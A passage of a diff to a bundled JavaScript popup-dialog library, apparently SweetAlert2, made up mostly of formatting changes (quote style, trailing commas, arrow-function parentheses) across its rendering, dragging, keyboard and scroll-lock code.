+  radio.textContent = "";
   return radio;
 };
 renderInputType.checkbox = (checkboxContainer, params) => {
-  const checkbox = getInput$1(getPopup(), 'checkbox');
-  checkbox.value = '1';
+  const checkbox = getInput$1(getPopup(), "checkbox");
+  checkbox.value = "1";
   checkbox.checked = Boolean(params.inputValue);
-  const label = checkboxContainer.querySelector('span');
+  const label = checkboxContainer.querySelector("span");
   setInnerHtml(label, params.inputPlaceholder || params.inputLabel);
   return checkbox;
 };
@@ -883,9 +792,9 @@ renderInputType.textarea = (textarea, params) => {
   checkAndSetInputValue(textarea, params.inputValue);
   setInputPlaceholder(textarea, params);
   setInputLabel(textarea, textarea, params);
-  const getMargin = el => parseInt(window.getComputedStyle(el).marginLeft) + parseInt(window.getComputedStyle(el).marginRight);
+  const getMargin = (el) => parseInt(window.getComputedStyle(el).marginLeft) + parseInt(window.getComputedStyle(el).marginRight);
   setTimeout(() => {
-    if ('MutationObserver' in window) {
+    if ("MutationObserver" in window) {
       const initialPopupWidth = parseInt(window.getComputedStyle(getPopup()).width);
       const textareaResizeHandler = () => {
         if (!document.body.contains(textarea)) {
@@ -895,12 +804,12 @@ renderInputType.textarea = (textarea, params) => {
         if (textareaWidth > initialPopupWidth) {
           getPopup().style.width = `${textareaWidth}px`;
         } else {
-          applyNumericalStyle(getPopup(), 'width', params.width);
+          applyNumericalStyle(getPopup(), "width", params.width);
         }
       };
       new MutationObserver(textareaResizeHandler).observe(textarea, {
         attributes: true,
-        attributeFilter: ['style'],
+        attributeFilter: ["style"]
       });
     }
   });
@@ -912,13 +821,13 @@ var renderContent = (instance, params) => {
     return;
   }
   showWhenInnerHtmlPresent(htmlContainer);
-  applyCustomClass(htmlContainer, params, 'htmlContainer');
+  applyCustomClass(htmlContainer, params, "htmlContainer");
   if (params.html) {
     parseHtmlToContainer(params.html, htmlContainer);
-    show(htmlContainer, 'block');
+    show(htmlContainer, "block");
   } else if (params.text) {
     htmlContainer.textContent = params.text;
-    show(htmlContainer, 'block');
+    show(htmlContainer, "block");
   } else {
     hide(htmlContainer);
   }
@@ -930,11 +839,11 @@ var renderFooter = (instance, params) => {
     return;
   }
   showWhenInnerHtmlPresent(footer);
-  toggle(footer, params.footer, 'block');
+  toggle(footer, params.footer, "block");
   if (params.footer) {
     parseHtmlToContainer(params.footer, footer);
   }
-  applyCustomClass(footer, params, 'footer');
+  applyCustomClass(footer, params, "footer");
 };
 var renderIcon = (instance, params) => {
   const innerParams = privateProps.innerParams.get(instance);
@@ -970,15 +879,15 @@ var applyStyles = (icon, params) => {
   addClass(icon, params.icon && iconTypes[params.icon]);
   setColor(icon, params);
   adjustSuccessIconBackgroundColor();
-  applyCustomClass(icon, params, 'icon');
+  applyCustomClass(icon, params, "icon");
 };
 var adjustSuccessIconBackgroundColor = () => {
   const popup = getPopup();
   if (!popup) {
     return;
   }
-  const popupBackgroundColor = window.getComputedStyle(popup).getPropertyValue('background-color');
-  const successIconParts = popup.querySelectorAll('[class^=swal2-success-circular-line], .swal2-success-fix');
+  const popupBackgroundColor = window.getComputedStyle(popup).getPropertyValue("background-color");
+  const successIconParts = popup.querySelectorAll("[class^=swal2-success-circular-line], .swal2-success-fix");
   for (let i = 0; i < successIconParts.length; i++) {
     successIconParts[i].style.backgroundColor = popupBackgroundColor;
   }
@@ -1000,19 +909,19 @@ var setContent = (icon, params) => {
     return;
   }
   let oldContent = icon.innerHTML;
-  let newContent = '';
+  let newContent = "";
   if (params.iconHtml) {
     newContent = iconContent(params.iconHtml);
-  } else if (params.icon === 'success') {
+  } else if (params.icon === "success") {
     newContent = successIconHtml;
-    oldContent = oldContent.replace(/ style=".*?"/g, '');
-  } else if (params.icon === 'error') {
+    oldContent = oldContent.replace(/ style=".*?"/g, "");
+  } else if (params.icon === "error") {
     newContent = errorIconHtml;
   } else if (params.icon) {
     const defaultIconHtml = {
-      question: '?',
-      warning: '!',
-      info: 'i',
+      question: "?",
+      warning: "!",
+      info: "i"
     };
     newContent = iconContent(defaultIconHtml[params.icon]);
   }
@@ -1026,12 +935,12 @@ var setColor = (icon, params) => {
   }
   icon.style.color = params.iconColor;
   icon.style.borderColor = params.iconColor;
-  for (const sel of ['.swal2-success-line-tip', '.swal2-success-line-long', '.swal2-x-mark-line-left', '.swal2-x-mark-line-right']) {
-    setStyle(icon, sel, 'background-color', params.iconColor);
+  for (const sel of [".swal2-success-line-tip", ".swal2-success-line-long", ".swal2-x-mark-line-left", ".swal2-x-mark-line-right"]) {
+    setStyle(icon, sel, "background-color", params.iconColor);
   }
-  setStyle(icon, '.swal2-success-ring', 'border-color', params.iconColor);
+  setStyle(icon, ".swal2-success-ring", "border-color", params.iconColor);
 };
-var iconContent = content => `<div class="${swalClasses['icon-content']}">${content}</div>`;
+var iconContent = (content) => `<div class="${swalClasses["icon-content"]}">${content}</div>`;
 var renderImage = (instance, params) => {
   const image = getImage();
   if (!image) {
@@ -1041,57 +950,57 @@ var renderImage = (instance, params) => {
     hide(image);
     return;
   }
-  show(image, '');
-  image.setAttribute('src', params.imageUrl);
-  image.setAttribute('alt', params.imageAlt || '');
-  applyNumericalStyle(image, 'width', params.imageWidth);
-  applyNumericalStyle(image, 'height', params.imageHeight);
+  show(image, "");
+  image.setAttribute("src", params.imageUrl);
+  image.setAttribute("alt", params.imageAlt || "");
+  applyNumericalStyle(image, "width", params.imageWidth);
+  applyNumericalStyle(image, "height", params.imageHeight);
   image.className = swalClasses.image;
-  applyCustomClass(image, params, 'image');
+  applyCustomClass(image, params, "image");
 };
 var dragging = false;
 var mousedownX = 0;
 var mousedownY = 0;
 var initialX = 0;
 var initialY = 0;
-var addDraggableListeners = popup => {
-  popup.addEventListener('mousedown', down);
-  document.body.addEventListener('mousemove', move);
-  popup.addEventListener('mouseup', up);
-  popup.addEventListener('touchstart', down);
-  document.body.addEventListener('touchmove', move);
-  popup.addEventListener('touchend', up);
+var addDraggableListeners = (popup) => {
+  popup.addEventListener("mousedown", down);
+  document.body.addEventListener("mousemove", move);
+  popup.addEventListener("mouseup", up);
+  popup.addEventListener("touchstart", down);
+  document.body.addEventListener("touchmove", move);
+  popup.addEventListener("touchend", up);
 };
-var removeDraggableListeners = popup => {
-  popup.removeEventListener('mousedown', down);
-  document.body.removeEventListener('mousemove', move);
-  popup.removeEventListener('mouseup', up);
-  popup.removeEventListener('touchstart', down);
-  document.body.removeEventListener('touchmove', move);
-  popup.removeEventListener('touchend', up);
+var removeDraggableListeners = (popup) => {
+  popup.removeEventListener("mousedown", down);
+  document.body.removeEventListener("mousemove", move);
+  popup.removeEventListener("mouseup", up);
+  popup.removeEventListener("touchstart", down);
+  document.body.removeEventListener("touchmove", move);
+  popup.removeEventListener("touchend", up);
 };
-var down = event => {
+var down = (event) => {
   const popup = getPopup();
-  if (
-    event.target === popup ||
-    getIcon().contains(
-      /** @type {HTMLElement} */
-      event.target
-    )
-  ) {
+  if (event.target === popup || getIcon().contains(
+    /** @type {HTMLElement} */
+    event.target
+  )) {
     dragging = true;
     const clientXY = getClientXY(event);
     mousedownX = clientXY.clientX;
     mousedownY = clientXY.clientY;
     initialX = parseInt(popup.style.insetInlineStart) || 0;
     initialY = parseInt(popup.style.insetBlockStart) || 0;
-    addClass(popup, 'swal2-dragging');
+    addClass(popup, "swal2-dragging");
   }
 };
-var move = event => {
+var move = (event) => {
   const popup = getPopup();
   if (dragging) {
-    let { clientX, clientY } = getClientXY(event);
+    let {
+      clientX,
+      clientY
+    } = getClientXY(event);
     popup.style.insetInlineStart = `${initialX + (clientX - mousedownX)}px`;
     popup.style.insetBlockStart = `${initialY + (clientY - mousedownY)}px`;
   }
@@ -1099,21 +1008,24 @@ var move = event => {
 var up = () => {
   const popup = getPopup();
   dragging = false;
-  removeClass(popup, 'swal2-dragging');
+  removeClass(popup, "swal2-dragging");
 };
-var getClientXY = event => {
-  let clientX = 0,
-    clientY = 0;
-  if (event.type.startsWith('mouse')) {
-    clientX = /** @type {MouseEvent} */ event.clientX;
-    clientY = /** @type {MouseEvent} */ event.clientY;
-  } else if (event.type.startsWith('touch')) {
-    clientX = /** @type {TouchEvent} */ event.touches[0].clientX;
-    clientY = /** @type {TouchEvent} */ event.touches[0].clientY;
+var getClientXY = (event) => {
+  let clientX = 0, clientY = 0;
+  if (event.type.startsWith("mouse")) {
+    clientX = /** @type {MouseEvent} */
+    event.clientX;
+    clientY = /** @type {MouseEvent} */
+    event.clientY;
+  } else if (event.type.startsWith("touch")) {
+    clientX = /** @type {TouchEvent} */
+    event.touches[0].clientX;
+    clientY = /** @type {TouchEvent} */
+    event.touches[0].clientY;
   }
   return {
     clientX,
-    clientY,
+    clientY
   };
 };
 var renderPopup = (instance, params) => {
@@ -1123,16 +1035,16 @@ var renderPopup = (instance, params) => {
     return;
   }
   if (params.toast) {
-    applyNumericalStyle(container, 'width', params.width);
-    popup.style.width = '100%';
+    applyNumericalStyle(container, "width", params.width);
+    popup.style.width = "100%";
     const loader = getLoader();
     if (loader) {
       popup.insertBefore(loader, getIcon());
     }
   } else {
-    applyNumericalStyle(popup, 'width', params.width);
+    applyNumericalStyle(popup, "width", params.width);
   }
-  applyNumericalStyle(popup, 'padding', params.padding);
+  applyNumericalStyle(popup, "padding", params.padding);
   if (params.color) {
     popup.style.color = params.color;
   }
@@ -1151,15 +1063,15 @@ var renderPopup = (instance, params) => {
 };
 var addClasses$1 = (popup, params) => {
   const showClass = params.showClass || {};
-  popup.className = `${swalClasses.popup} ${isVisible$1(popup) ? showClass.popup : ''}`;
+  popup.className = `${swalClasses.popup} ${isVisible$1(popup) ? showClass.popup : ""}`;
   if (params.toast) {
-    addClass([document.documentElement, document.body], swalClasses['toast-shown']);
+    addClass([document.documentElement, document.body], swalClasses["toast-shown"]);
     addClass(popup, swalClasses.toast);
   } else {
     addClass(popup, swalClasses.modal);
   }
-  applyCustomClass(popup, params, 'popup');
-  if (typeof params.customClass === 'string') {
+  applyCustomClass(popup, params, "popup");
+  if (typeof params.customClass === "string") {
     addClass(popup, params.customClass);
   }
   if (params.icon) {
@@ -1171,21 +1083,24 @@ var renderProgressSteps = (instance, params) => {
   if (!progressStepsContainer) {
     return;
   }
-  const { progressSteps, currentProgressStep } = params;
+  const {
+    progressSteps,
+    currentProgressStep
+  } = params;
   if (!progressSteps || progressSteps.length === 0 || currentProgressStep === void 0) {
     hide(progressStepsContainer);
     return;
   }
   show(progressStepsContainer);
-  progressStepsContainer.textContent = '';
+  progressStepsContainer.textContent = "";
   if (currentProgressStep >= progressSteps.length) {
-    warn('Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)');
+    warn("Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)");
   }
   progressSteps.forEach((step, index) => {
     const stepEl = createStepElement(step);
     progressStepsContainer.appendChild(stepEl);
     if (index === currentProgressStep) {
-      addClass(stepEl, swalClasses['active-progress-step']);
+      addClass(stepEl, swalClasses["active-progress-step"]);
     }
     if (index !== progressSteps.length - 1) {
       const lineEl = createLineElement(params);
@@ -1193,17 +1108,17 @@ var renderProgressSteps = (instance, params) => {
     }
   });
 };
-var createStepElement = step => {
-  const stepEl = document.createElement('li');
-  addClass(stepEl, swalClasses['progress-step']);
+var createStepElement = (step) => {
+  const stepEl = document.createElement("li");
+  addClass(stepEl, swalClasses["progress-step"]);
   setInnerHtml(stepEl, step);
   return stepEl;
 };
-var createLineElement = params => {
-  const lineEl = document.createElement('li');
-  addClass(lineEl, swalClasses['progress-step-line']);
+var createLineElement = (params) => {
+  const lineEl = document.createElement("li");
+  addClass(lineEl, swalClasses["progress-step-line"]);
   if (params.progressStepsDistance) {
-    applyNumericalStyle(lineEl, 'width', params.progressStepsDistance);
+    applyNumericalStyle(lineEl, "width", params.progressStepsDistance);
   }
   return lineEl;
 };
@@ -1213,14 +1128,14 @@ var renderTitle = (instance, params) => {
     return;
   }
   showWhenInnerHtmlPresent(title);
-  toggle(title, params.title || params.titleText, 'block');
+  toggle(title, params.title || params.titleText, "block");
   if (params.title) {
     parseHtmlToContainer(params.title, title);
   }
   if (params.titleText) {
     title.innerText = params.titleText;
   }
-  applyCustomClass(title, params, 'title');
+  applyCustomClass(title, params, "title");
 };
 var render = (instance, params) => {
   renderPopup(instance, params);
@@ -1234,10 +1149,10 @@ var render = (instance, params) => {
   renderActions(instance, params);
   renderFooter(instance, params);
   const popup = getPopup();
-  if (typeof params.didRender === 'function' && popup) {
+  if (typeof params.didRender === "function" && popup) {
     params.didRender(popup);
   }
-  globalState.eventEmitter.emit('didRender', popup);
+  globalState.eventEmitter.emit("didRender", popup);
 };
 var isVisible = () => {
   return isVisible$1(getPopup());
@@ -1255,16 +1170,16 @@ var clickCancel = () => {
   return (_dom$getCancelButton = getCancelButton()) === null || _dom$getCancelButton === void 0 ? void 0 : _dom$getCancelButton.click();
 };
 var DismissReason = Object.freeze({
-  cancel: 'cancel',
-  backdrop: 'backdrop',
-  close: 'close',
-  esc: 'esc',
-  timer: 'timer',
+  cancel: "cancel",
+  backdrop: "backdrop",
+  close: "close",
+  esc: "esc",
+  timer: "timer"
 });
-var removeKeydownHandler = globalState2 => {
+var removeKeydownHandler = (globalState2) => {
   if (globalState2.keydownTarget && globalState2.keydownHandlerAdded) {
-    globalState2.keydownTarget.removeEventListener('keydown', globalState2.keydownHandler, {
-      capture: globalState2.keydownListenerCapture,
+    globalState2.keydownTarget.removeEventListener("keydown", globalState2.keydownHandler, {
+      capture: globalState2.keydownListenerCapture
     });
     globalState2.keydownHandlerAdded = false;
   }
@@ -1272,11 +1187,11 @@ var removeKeydownHandler = globalState2 => {
 var addKeydownHandler = (globalState2, innerParams, dismissWith) => {
   removeKeydownHandler(globalState2);
   if (!innerParams.toast) {
-    globalState2.keydownHandler = e => keydownHandler(innerParams, e, dismissWith);
+    globalState2.keydownHandler = (e) => keydownHandler(innerParams, e, dismissWith);
     globalState2.keydownTarget = innerParams.keydownListenerCapture ? window : getPopup();
     globalState2.keydownListenerCapture = innerParams.keydownListenerCapture;
-    globalState2.keydownTarget.addEventListener('keydown', globalState2.keydownHandler, {
-      capture: globalState2.keydownListenerCapture,
+    globalState2.keydownTarget.addEventListener("keydown", globalState2.keydownHandler, {
+      capture: globalState2.keydownListenerCapture
     });
     globalState2.keydownHandlerAdded = true;
   }
@@ -1296,8 +1211,8 @@ var setFocus = (index, increment) => {
   }
   (_dom$getPopup = getPopup()) === null || _dom$getPopup === void 0 || _dom$getPopup.focus();
 };
-var arrowKeysNextButton = ['ArrowRight', 'ArrowDown'];
-var arrowKeysPreviousButton = ['ArrowLeft', 'ArrowUp'];
+var arrowKeysNextButton = ["ArrowRight", "ArrowDown"];
+var arrowKeysPreviousButton = ["ArrowLeft", "ArrowUp"];
 var keydownHandler = (innerParams, event, dismissWith) => {
   if (!innerParams) {
     return;
@@ -1308,13 +1223,13 @@ var keydownHandler = (innerParams, event, dismissWith) => {
   if (innerParams.stopKeydownPropagation) {
     event.stopPropagation();
   }
-  if (event.key === 'Enter') {
+  if (event.key === "Enter") {
     handleEnter(event, innerParams);
-  } else if (event.key === 'Tab') {
+  } else if (event.key === "Tab") {
     handleTab(event);
   } else if ([...arrowKeysNextButton, ...arrowKeysPreviousButton].includes(event.key)) {
     handleArrows(event.key);
-  } else if (event.key === 'Escape') {
+  } else if (event.key === "Escape") {
     handleEsc(event, innerParams, dismissWith);
   }
 };
@@ -1324,14 +1239,14 @@ var handleEnter = (event, innerParams) => {
   }
   const input = getInput$1(getPopup(), innerParams.input);
   if (event.target && input && event.target instanceof HTMLElement && event.target.outerHTML === input.outerHTML) {
-    if (['textarea', 'file'].includes(innerParams.input)) {
+    if (["textarea", "file"].includes(innerParams.input)) {
       return;
     }
     clickConfirm();
     event.preventDefault();
   }
 };
-var handleTab = event => {
+var handleTab = (event) => {
   const targetElement = event.target;
   const focusableElements = getFocusableElements();
   let btnIndex = -1;
@@ -1349,7 +1264,7 @@ var handleTab = event => {
   event.stopPropagation();
   event.preventDefault();
 };
-var handleArrows = key => {
+var handleArrows = (key) => {
   const actions = getActions();
   const confirmButton = getConfirmButton();
   const denyButton = getDenyButton();
@@ -1361,7 +1276,7 @@ var handleArrows = key => {
   if (document.activeElement instanceof HTMLElement && !buttons.includes(document.activeElement)) {
     return;
   }
-  const sibling = arrowKeysNextButton.includes(key) ? 'nextElementSibling' : 'previousElementSibling';
+  const sibling = arrowKeysNextButton.includes(key) ? "nextElementSibling" : "previousElementSibling";
   let buttonToFocus = document.activeElement;
   if (!buttonToFocus) {
     return;
@@ -1387,33 +1302,33 @@ var handleEsc = (event, innerParams, dismissWith) => {
 };
 var privateMethods = {
   swalPromiseResolve: /* @__PURE__ */ new WeakMap(),
-  swalPromiseReject: /* @__PURE__ */ new WeakMap(),
+  swalPromiseReject: /* @__PURE__ */ new WeakMap()
 };
 var setAriaHidden = () => {
   const container = getContainer();
   const bodyChildren = Array.from(document.body.children);
-  bodyChildren.forEach(el => {
+  bodyChildren.forEach((el) => {
     if (el.contains(container)) {
       return;
     }
-    if (el.hasAttribute('aria-hidden')) {
-      el.setAttribute('data-previous-aria-hidden', el.getAttribute('aria-hidden') || '');
+    if (el.hasAttribute("aria-hidden")) {
+      el.setAttribute("data-previous-aria-hidden", el.getAttribute("aria-hidden") || "");
     }
-    el.setAttribute('aria-hidden', 'true');
+    el.setAttribute("aria-hidden", "true");
   });
 };
 var unsetAriaHidden = () => {
   const bodyChildren = Array.from(document.body.children);
-  bodyChildren.forEach(el => {
-    if (el.hasAttribute('data-previous-aria-hidden')) {
-      el.setAttribute('aria-hidden', el.getAttribute('data-previous-aria-hidden') || '');
-      el.removeAttribute('data-previous-aria-hidden');
+  bodyChildren.forEach((el) => {
+    if (el.hasAttribute("data-previous-aria-hidden")) {
+      el.setAttribute("aria-hidden", el.getAttribute("data-previous-aria-hidden") || "");
+      el.removeAttribute("data-previous-aria-hidden");
     } else {
-      el.removeAttribute('aria-hidden');
+      el.removeAttribute("aria-hidden");
     }
   });
 };
-var isSafariOrIOS = typeof window !== 'undefined' && !!window.GestureEvent;
+var isSafariOrIOS = typeof window !== "undefined" && !!window.GestureEvent;
 var iOSfix = () => {
   if (isSafariOrIOS && !hasClass(document.body, swalClasses.iosfix)) {
     const offset = document.body.scrollTop;
@@ -1428,17 +1343,17 @@ var lockBodyScroll = () => {
     return;
   }
   let preventTouchMove;
-  container.ontouchstart = event => {
+  container.ontouchstart = (event) => {
     preventTouchMove = shouldPreventTouchMove(event);
   };
-  container.ontouchmove = event => {
+  container.ontouchmove = (event) => {
     if (preventTouchMove) {
       event.preventDefault();
       event.stopPropagation();
     }
   };
 };
-var shouldPreventTouchMove = event => {
+var shouldPreventTouchMove = (event) => {
   const target = event.target;
   const container = getContainer();
   const htmlContainer = getHtmlContainer();
@@ -1451,49 +1366,43 @@ var shouldPreventTouchMove = event => {
   if (target === container) {
     return true;
   }
-  if (
-    !isScrollable(container) &&
-    target instanceof HTMLElement &&
-    target.tagName !== 'INPUT' && // #1603
-    target.tagName !== 'TEXTAREA' && // #2266
-    !(
-      isScrollable(htmlContainer) && // #1944
-      htmlContainer.contains(target)
-    )
-  ) {
+  if (!isScrollable(container) && target instanceof HTMLElement && target.tagName !== "INPUT" && // #1603
+  target.tagName !== "TEXTAREA" && // #2266
+  !(isScrollable(htmlContainer) && // #1944
+  htmlContainer.contains(target))) {
     return true;
   }
   return false;
 };
-var isStylus = event => {
-  return event.touches && event.touches.length && event.touches[0].touchType === 'stylus';
+var isStylus = (event) => {
+  return event.touches && event.touches.length && event.touches[0].touchType === "stylus";
 };
-var isZoom = event => {
+var isZoom = (event) => {
   return event.touches && event.touches.length > 1;
 };
 var undoIOSfix = () => {
   if (hasClass(document.body, swalClasses.iosfix)) {
     const offset = parseInt(document.body.style.top, 10);
     removeClass(document.body, swalClasses.iosfix);
-    document.body.style.top = '';
+    document.body.style.top = "";
     document.body.scrollTop = offset * -1;
   }
 };
 var measureScrollbar = () => {
-  const scrollDiv = document.createElement('div');
-  scrollDiv.className = swalClasses['scrollbar-measure'];
+  const scrollDiv = document.createElement("div");
+  scrollDiv.className = swalClasses["scrollbar-measure"];
   document.body.appendChild(scrollDiv);
   const scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth;
   document.body.removeChild(scrollDiv);
   return scrollbarWidth;
 };
 var previousBodyPadding = null;
-var replaceScrollbarWithPadding = initialBodyOverflow => {
+var replaceScrollbarWithPadding = (initialBodyOverflow) => {
   if (previousBodyPadding !== null) {
     return;
   }
-  if (document.body.scrollHeight > window.innerHeight || initialBodyOverflow === 'scroll') {
-    previousBodyPadding = parseInt(window.getComputedStyle(document.body).getPropertyValue('padding-right'));
+  if (document.body.scrollHeight > window.innerHeight || initialBodyOverflow === "scroll") {
+    previousBodyPadding = parseInt(window.getComputedStyle(document.body).getPropertyValue("padding-right"));
     document.body.style.paddingRight = `${previousBodyPadding + measureScrollbar()}px`;
   }
 };
@@ -1511,9 +1420,9 @@ function removePopupAndResetState(instance, container, returnFocus, didClose) {
     removeKeydownHandler(globalState);
   }
   if (isSafariOrIOS) {
-    container.setAttribute('style', 'display:none !important');
-    container.removeAttribute('class');
-    container.innerHTML = '';
+    container.setAttribute("style", "display:none !important");
+    container.removeAttribute("class");
+    container.innerHTML = "";
   } else {
     container.remove();
   }
@@ -1525,10 +1434,7 @@ function removePopupAndResetState(instance, container, returnFocus, didClose) {
   removeBodyClasses();
 }
 function removeBodyClasses() {
-  removeClass(
-    [document.documentElement, document.body],
-    [swalClasses.shown, swalClasses['height-auto'], swalClasses['no-backdrop'], swalClasses['toast-shown']]
-  );
+  removeClass([document.documentElement, document.body], [swalClasses.shown, swalClasses["height-auto"], swalClasses["no-backdrop"], swalClasses["toast-shown"]]);
 }
 function close(resolveValue) {
   resolveValue = prepareResolveValue(resolveValue);
@@ -1543,7 +1449,7 @@ function close(resolveValue) {
     swalPromiseResolve(resolveValue);
   }
 }
-var triggerClosePopup = instance => {
+var triggerClosePopup = (instance) => {
   const popup = getPopup();
   if (!popup) {
     return false;
@@ -1567,7 +1473,7 @@ function rejectPromise(error2) {
     rejectPromise2(error2);
   }
 }
-var handleAwaitingPromise = instance => {
+var handleAwaitingPromise = (instance) => {
   if (instance.isAwaitingPromise) {
     delete instance.isAwaitingPromise;
     if (!privateProps.innerParams.get(instance)) {
@@ -1575,31 +1481,28 @@ var handleAwaitingPromise = instance => {
     }
   }
 };
-var prepareResolveValue = resolveValue => {
-  if (typeof resolveValue === 'undefined') {
+var prepareResolveValue = (resolveValue) => {
+  if (typeof resolveValue === "undefined") {
     return {
       isConfirmed: false,
       isDenied: false,
-      isDismissed: true,
+      isDismissed: true
     };
   }
-  return Object.assign(
-    {
-      isConfirmed: false,
-      isDenied: false,
-      isDismissed: false,
-    },
-    resolveValue
-  );
+  return Object.assign({
+    isConfirmed: false,
+    isDenied: false,
+    isDismissed: false
+  }, resolveValue);
 };
 var handlePopupAnimation = (instance, popup, innerParams) => {
   var _globalState$eventEmi;
   const container = getContainer();
   const animationIsSupported = hasCssAnimation(popup);
-  if (typeof innerParams.willClose === 'function') {
+  if (typeof innerParams.willClose === "function") {
     innerParams.willClose(popup);
   }
-  (_globalState$eventEmi = globalState.eventEmitter) === null || _globalState$eventEmi === void 0 || _globalState$eventEmi.emit('willClose', popup);
+  (_globalState$eventEmi = globalState.eventEmitter) === null || _globalState$eventEmi === void 0 || _globalState$eventEmi.emit("willClose", popup);
   if (animationIsSupported) {
     animatePopup(instance, popup, container, innerParams.returnFocus, innerParams.didClose);
   } else {
@@ -1608,33 +1511,31 @@ var handlePopupAnimation = (instance, popup, innerParams) => {
 };
 var animatePopup = (instance, popup, container, returnFocus, didClose) => {
   globalState.swalCloseEventFinishedCallback = removePopupAndResetState.bind(null, instance, container, returnFocus, didClose);
-  const swalCloseAnimationFinished = function (e) {
+  const swalCloseAnimationFinished = function(e) {
     if (e.target === popup) {
       var _globalState$swalClos;
-      (_globalState$swalClos = globalState.swalCloseEventFinishedCallback) === null ||
-        _globalState$swalClos === void 0 ||
-        _globalState$swalClos.call(globalState);
+      (_globalState$swalClos = globalState.swalCloseEventFinishedCallback) === null || _globalState$swalClos === void 0 || _globalState$swalClos.call(globalState);
       delete globalState.swalCloseEventFinishedCallback;
-      popup.removeEventListener('animationend', swalCloseAnimationFinished);
-      popup.removeEventListener('transitionend', swalCloseAnimationFinished);
+      popup.removeEventListener("animationend", swalCloseAnimationFinished);
+      popup.removeEventListener("transitionend", swalCloseAnimationFinished);
     }
   };
-  popup.addEventListener('animationend', swalCloseAnimationFinished);
-  popup.addEventListener('transitionend', swalCloseAnimationFinished);
+  popup.addEventListener("animationend", swalCloseAnimationFinished);
+  popup.addEventListener("transitionend", swalCloseAnimationFinished);
 };
 var triggerDidCloseAndDispose = (instance, didClose) => {
   setTimeout(() => {
     var _globalState$eventEmi2;
-    if (typeof didClose === 'function') {
+    if (typeof didClose === "function") {
       didClose.bind(instance.params)();
     }
-    (_globalState$eventEmi2 = globalState.eventEmitter) === null || _globalState$eventEmi2 === void 0 || _globalState$eventEmi2.emit('didClose');
+    (_globalState$eventEmi2 = globalState.eventEmitter) === null || _globalState$eventEmi2 === void 0 || _globalState$eventEmi2.emit("didClose");
     if (instance._destroy) {
       instance._destroy();
     }
   });
 };
-var showLoading = buttonToReplace => {
+var showLoading = (buttonToReplace) => {
   let popup = getPopup();
   if (!popup) {
     new Swal();
@@ -1650,8 +1551,8 @@ var showLoading = buttonToReplace => {
     replaceButton(popup, buttonToReplace);
   }
   show(loader);
-  popup.setAttribute('data-loading', 'true');
-  popup.setAttribute('aria-busy', 'true');
+  popup.setAttribute("data-loading", "true");
+  popup.setAttribute("aria-busy", "true");
   popup.focus();
 };
 var replaceButton = (popup, buttonToReplace) => {
@@ -1666,18 +1567,15 @@ var replaceButton = (popup, buttonToReplace) => {
   show(actions);
   if (buttonToReplace) {
     hide(buttonToReplace);
-    loader.setAttribute('data-button-to-replace', buttonToReplace.className);
+    loader.setAttribute("data-button-to-replace", buttonToReplace.className);
     actions.insertBefore(loader, buttonToReplace);
   }
   addClass([popup, actions], swalClasses.loading);
 };
 var handleInputOptionsAndValue = (instance, params) => {
-  if (params.input === 'select' || params.input === 'radio') {
+  if (params.input === "select" || params.input === "radio") {
     handleInputOptions(instance, params);
-  } else if (
-    ['text', 'email', 'number', 'tel', 'textarea'].some(i => i === params.input) &&
-    (hasToPromiseFn(params.inputValue) || isPromise(params.inputValue))
-  ) {
+  } else if (["text", "email", "number", "tel", "textarea"].some((i) => i === params.input) && (hasToPromiseFn(params.inputValue) || isPromise(params.inputValue))) {
     showLoading(getConfirmButton());
     handleInputValue(instance, params);
   }
@@ -1688,38 +1586,38 @@ var getInputValue = (instance, innerParams) => {
     return null;
   }
   switch (innerParams.input) {
-    case 'checkbox':
+    case "checkbox":
       return getCheckboxValue(input);
-    case 'radio':
+    case "radio":
       return getRadioValue(input);
-    case 'file':
+    case "file":
       return getFileValue(input);
     default:
       return innerParams.inputAutoTrim ? input.value.trim() : input.value;
   }
 };
-var getCheckboxValue = input => (input.checked ? 1 : 0);
-var getRadioValue = input => (input.checked ? input.value : null);
-var getFileValue = input => (input.files && input.files.length ? (input.getAttribute('multiple') !== null ? input.files : input.files[0]) : null);
+var getCheckboxValue = (input) => input.checked ? 1 : 0;
+var getRadioValue = (input) => input.checked ? input.value : null;
+var getFileValue = (input) => input.files && input.files.length ? input.getAttribute("multiple") !== null ? input.files : input.files[0] : null;
 var handleInputOptions = (instance, params) => {
   const popup = getPopup();
   if (!popup) {
     return;
   }
-  const processInputOptions = inputOptions => {
-    if (params.input === 'select') {
+  const processInputOptions = (inputOptions) => {
+    if (params.input === "select") {
       populateSelectOptions(popup, formatInputOptions(inputOptions), params);
-    } else if (params.input === 'radio') {
+    } else if (params.input === "radio") {
       populateRadioOptions(popup, formatInputOptions(inputOptions), params);
     }
   };
   if (hasToPromiseFn(params.inputOptions) || isPromise(params.inputOptions)) {
     showLoading(getConfirmButton());
-    asPromise(params.inputOptions).then(inputOptions => {
+    asPromise(params.inputOptions).then((inputOptions) => {
       instance.hideLoading();
       processInputOptions(inputOptions);
     });
-  } else if (typeof params.inputOptions === 'object') {
+  } else if (typeof params.inputOptions === "object") {
     processInputOptions(params.inputOptions);
   } else {
     error(`Unexpected type of inputOptions! Expected object, Map or Promise, got ${typeof params.inputOptions}`);
@@ -1731,20 +1629,18 @@ var handleInputValue = (instance, params) => {
     return;
   }
   hide(input);
-  asPromise(params.inputValue)
-    .then(inputValue => {
-      input.value = params.input === 'number' ? `${parseFloat(inputValue) || 0}` : `${inputValue}`;
-      show(input);
-      input.focus();
-      instance.hideLoading();
-    })
-    .catch(err => {
-      error(`Error in inputValue promise: ${err}`);
-      input.value = '';
-      show(input);
-      input.focus();
-      instance.hideLoading();
-    });
+  asPromise(params.inputValue).then((inputValue) => {
+    input.value = params.input === "number" ? `${parseFloat(inputValue) || 0}` : `${inputValue}`;
+    show(input);
+    input.focus();
+    instance.hideLoading();
+  }).catch((err) => {
+    error(`Error in inputValue promise: ${err}`);
+    input.value = "";
+    show(input);
+    input.focus();
+    instance.hideLoading();
+  });
 };
 function populateSelectOptions(popup, inputOptions, params) {
   const select = getDirectChildByClass(popup, swalClasses.select);
@@ -1752,21 +1648,21 @@ function populateSelectOptions(popup, inputOptions, params) {
     return;
   }
   const renderOption = (parent, optionLabel, optionValue) => {
-    const option = document.createElement('option');
+    const option = document.createElement("option");
     option.value = optionValue;
     setInnerHtml(option, optionLabel);
     option.selected = isSelected(optionValue, params.inputValue);
     parent.appendChild(option);
   };
-  inputOptions.forEach(inputOption => {
